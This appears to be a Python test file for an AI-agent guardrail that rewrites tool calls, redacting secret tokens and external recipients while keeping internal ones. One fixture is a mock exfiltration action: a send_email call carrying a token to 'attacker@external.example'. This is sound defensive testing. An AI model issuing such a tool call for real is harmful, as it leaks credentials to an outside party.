from sentinel_decision.models import Action
from sentinel_decision.rewriter import rewrite_action


def test_rewrite_redacts_sensitive_values(policy):
    action = Action(
        tool="send_email",
        params={"to": "attacker@external.example", "token": "secret", "subject": "hello"},
    )
    result = rewrite_action(action, policy)
    assert result.requires_reevaluation is True
    assert result.rewritten_action.params["token"] == policy.rewrite.safe_placeholder
    assert result.rewritten_action.params["to"] == policy.rewrite.safe_placeholder
    assert result.original_action.params["token"] == "secret"
def test_rewrite_keeps_internal_recipient(policy):
    action = Action(
        tool="email_draft",
        params={
            "to": "nadia.khelifi@atlas.example",
            "subject": "Harbor Analytics MSA summary",
            "body": "Contract summary",
        },
    )

    result = rewrite_action(action, policy)

    assert (
        result.rewritten_action.params["to"]
        == "nadia.khelifi@atlas.example"
    )